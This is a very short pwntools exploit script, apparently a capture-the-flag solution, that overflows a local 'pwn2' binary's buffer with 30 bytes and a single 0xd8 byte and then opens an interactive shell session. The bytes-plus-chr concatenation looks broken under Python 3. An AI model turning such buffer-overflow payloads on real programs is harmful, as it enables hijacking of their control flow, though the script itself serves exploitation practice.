from pwn import * 

target = process("./pwn2")

payload = b"A"* 30
payload += chr(0xd8)

target.sendline(payload)

target.interactive()